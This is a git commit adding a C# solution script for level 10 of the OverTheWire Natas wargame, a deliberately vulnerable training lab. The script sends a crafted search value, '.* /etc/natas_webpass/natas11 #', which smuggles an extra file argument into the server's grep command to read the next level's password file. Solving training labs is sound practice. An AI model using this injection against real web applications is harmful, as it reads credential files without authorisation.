b8f18fc50617ed11625e7a46c1802d7ea590c67f
Cytrix <code@cytrix.dev>
2022-10-29 02:19:53 -0400

    Create natas10.cs

---
+++ Wargame/Natas/natas10.cs
@@ -0,0 +1,23 @@
+using System.Net.Http;
+using System.Text;
+
+HttpClient client = new HttpClient();
+client.BaseAddress = new Uri("http://natas10.natas.labs.overthewire.org");
+
+//HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, "/index.php");
+//HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, "/index-source.html");
+HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Post, "/index.php");
+
+string credential = Convert.ToBase64String(ASCIIEncoding.ASCII.GetBytes("natas10:???????????????????????????????????????"));
+request.Headers.Add("Authorization", "Basic " + credential);
+
+string needle = ".* /etc/natas_webpass/natas11 #";
+
+request.Headers.Add("ContentType", "application/x-www-form-urlencoded");
+request.Content = new FormUrlEncodedContent(new[] { new KeyValuePair<string, string>("needle", needle), new KeyValuePair<string, string>("submit", "Submit") });
+
+
+HttpResponseMessage httpResponse = await client.SendAsync(request);
+httpResponse.EnsureSuccessStatusCode();
+String body = await httpResponse.Content.ReadAsStringAsync();
+Console.WriteLine(body) ;
